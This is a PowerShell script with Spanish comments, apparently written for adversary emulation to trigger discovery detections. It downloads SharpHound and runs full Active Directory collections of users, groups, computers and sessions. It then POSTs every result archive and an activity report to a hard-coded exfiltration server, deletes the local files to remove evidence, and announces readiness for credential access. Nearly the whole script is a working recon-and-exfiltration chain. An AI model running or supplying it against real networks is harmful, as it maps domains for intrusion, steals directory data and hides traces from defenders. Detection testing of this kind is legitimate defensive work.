# === BLOODHOUND RECONNAISSANCE SCRIPT ===
# Script lineal para activar detecciones de discovery

Write-Host "=== BLOODHOUND DISCOVERY PHASE ===" -ForegroundColor Red

# PASO 1: Crear directorio de trabajo
Write-Host "[1] Creando directorio de trabajo..." -ForegroundColor Yellow
New-Item -ItemType Directory -Path "C:\temp\bloodhound" -Force

# PASO 2: Cambiar al directorio
Set-Location "C:\temp\bloodhound"

# PASO 3: Definir URL de descarga
$SharpHoundURL = "https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.1/SharpHound-v1.1.1.zip"
Write-Host "[2] URL configurada: $SharpHoundURL"

# PASO 4: Descargar SharpHound
Write-Host "[3] Descargando SharpHound..." -ForegroundColor Yellow
Invoke-WebRequest -Uri $SharpHoundURL -OutFile "sharphound.zip" -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# PASO 5: Extraer archivo
Write-Host "[4] Extrayendo SharpHound..." -ForegroundColor Yellow
Expand-Archive -Path "sharphound.zip" -DestinationPath "." -Force

# PASO 6: Verificar extracción
$SharpHoundExe = Get-ChildItem "SharpHound.exe"
Write-Host "[5] SharpHound extraído: $($SharpHoundExe.Name)"

# PASO 7: Obtener información del dominio
$DomainName = $env:USERDOMAIN
Write-Host "[6] Dominio objetivo: $DomainName"

# PASO 8: Crear timestamp para archivos
$Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
Write-Host "[7] Timestamp generado: $Timestamp"

# PASO 9: Ejecutar SharpHound - Colección completa
Write-Host "[8] Ejecutando SharpHound colección completa..." -ForegroundColor Red
.\SharpHound.exe -c All -d $DomainName --zipfilename "bloodhound_$Timestamp.zip"

# PASO 10: Pausa para completar colección
Start-Sleep -Seconds 10
Write-Host "[9] Colección completada"

# PASO 11: Verificar archivo generado
$BloodhoundZip = Get-ChildItem "bloodhound_$Timestamp.zip"
Write-Host "[10] Archivo generado: $($BloodhoundZip.Name)"
Write-Host "[10] Tamaño: $($BloodhoundZip.Length) bytes"

# PASO 12: Ejecutar colección adicional - Solo usuarios
Write-Host "[11] Ejecutando colección de usuarios..." -ForegroundColor Red
.\SharpHound.exe -c User -d $DomainName --zipfilename "users_$Timestamp.zip"

# PASO 13: Ejecutar colección adicional - Solo grupos
Write-Host "[12] Ejecutando colección de grupos..." -ForegroundColor Red
.\SharpHound.exe -c Group -d $DomainName --zipfilename "groups_$Timestamp.zip"

# PASO 14: Ejecutar colección adicional - Solo computadoras
Write-Host "[13] Ejecutando colección de computadoras..." -ForegroundColor Red
.\SharpHound.exe -c Computer -d $DomainName --zipfilename "computers_$Timestamp.zip"

# PASO 15: Ejecutar colección adicional - Solo sesiones
Write-Host "[14] Ejecutando colección de sesiones..." -ForegroundColor Red
.\SharpHound.exe -c Session -d $DomainName --zipfilename "sessions_$Timestamp.zip"

# PASO 16: Listar todos los archivos generados
$GeneratedFiles = Get-ChildItem "*.zip"
Write-Host "[15] Archivos generados: $($GeneratedFiles.Count)"

# PASO 17: Configurar servidor de exfiltración
$ExfilIP = "10.1.69.100"  # CAMBIAR IP AQUÍ
$ExfilURL = "http://$ExfilIP`:8000"
Write-Host "[16] Servidor de exfiltración: $ExfilURL"

# PASO 18: Exfiltrar archivo principal
Write-Host "[17] Exfiltrando archivo principal..." -ForegroundColor Red
$MainFile = "bloodhound_$Timestamp.zip"
$MainFileBytes = [System.IO.File]::ReadAllBytes($MainFile)
Invoke-RestMethod -Uri $ExfilURL -Method POST -Body $MainFileBytes -ContentType "application/zip" -Headers @{"X-Filename" = $MainFile}

# PASO 19: Exfiltrar archivo de usuarios
Write-Host "[18] Exfiltrando datos de usuarios..." -ForegroundColor Red
$UsersFile = "users_$Timestamp.zip"
$UsersFileBytes = [System.IO.File]::ReadAllBytes($UsersFile)
Invoke-RestMethod -Uri $ExfilURL -Method POST -Body $UsersFileBytes -ContentType "application/zip" -Headers @{"X-Filename" = $UsersFile}

# PASO 20: Exfiltrar archivo de grupos
Write-Host "[19] Exfiltrando datos de grupos..." -ForegroundColor Red
$GroupsFile = "groups_$Timestamp.zip"
$GroupsFileBytes = [System.IO.File]::ReadAllBytes($GroupsFile)
Invoke-RestMethod -Uri $ExfilURL -Method POST -Body $GroupsFileBytes -ContentType "application/zip" -Headers @{"X-Filename" = $GroupsFile}

# PASO 21: Exfiltrar archivo de computadoras
Write-Host "[20] Exfiltrando datos de computadoras..." -ForegroundColor Red
$ComputersFile = "computers_$Timestamp.zip"
$ComputersFileBytes = [System.IO.File]::ReadAllBytes($ComputersFile)
Invoke-RestMethod -Uri $ExfilURL -Method POST -Body $ComputersFileBytes -ContentType "application/zip" -Headers @{"X-Filename" = $ComputersFile}

# PASO 22: Exfiltrar archivo de sesiones
Write-Host "[21] Exfiltrando datos de sesiones..." -ForegroundColor Red
$SessionsFile = "sessions_$Timestamp.zip"
$SessionsFileBytes = [System.IO.File]::ReadAllBytes($SessionsFile)
Invoke-RestMethod -Uri $ExfilURL -Method POST -Body $SessionsFileBytes -ContentType "application/zip" -Headers @{"X-Filename" = $SessionsFile}

# PASO 23: Crear reporte de actividad
Write-Host "[22] Creando reporte de actividad..." -ForegroundColor Yellow
$ActivityReport = "=== BLOODHOUND ACTIVITY REPORT ===`n"
$ActivityReport += "Timestamp: $(Get-Date)`n"
$ActivityReport += "Domain: $DomainName`n"
$ActivityReport += "Hostname: $env:COMPUTERNAME`n"
$ActivityReport += "User: $env:USERNAME`n"
$ActivityReport += "SharpHound Version: Downloaded from GitHub`n"
$ActivityReport += "Collections Performed: All, User, Group, Computer, Session`n"
$ActivityReport += "Files Generated: $($GeneratedFiles.Count)`n"
$ActivityReport += "Total Data Size: $([math]::Round(($GeneratedFiles | Measure-Object Length -Sum).Sum / 1MB, 2)) MB`n"
$ActivityReport += "Exfiltration Target: $ExfilURL`n"
$ActivityReport += "=== END REPORT ==="

# PASO 24: Exfiltrar reporte de actividad
Write-Host "[23] Exfiltrando reporte de actividad..." -ForegroundColor Red
$ReportBytes = [System.Text.Encoding]::UTF8.GetBytes($ActivityReport)
Invoke-RestMethod -Uri $ExfilURL -Method POST -Body $ReportBytes -ContentType "text/plain" -Headers @{"X-Filename" = "bloodhound_activity_report.txt"}

# PASO 25: Limpiar evidencia local
Write-Host "[24] Limpiando evidencia local..." -ForegroundColor Yellow
Remove-Item "bloodhound_$Timestamp.zip" -Force
Remove-Item "users_$Timestamp.zip" -Force
Remove-Item "groups_$Timestamp.zip" -Force
Remove-Item "computers_$Timestamp.zip" -Force
Remove-Item "sessions_$Timestamp.zip" -Force
Remove-Item "sharphound.zip" -Force
Remove-Item "SharpHound.exe" -Force

# PASO 26: Finalizar
Write-Host "=== BLOODHOUND RECONNAISSANCE COMPLETED ===" -ForegroundColor Red
Write-Host "BloodHound collections: 5"
Write-Host "Files exfiltrated: 6 (5 data + 1 report)"
Write-Host "Local evidence: Cleaned"
Write-Host "Ready for next phase: Credential Access"
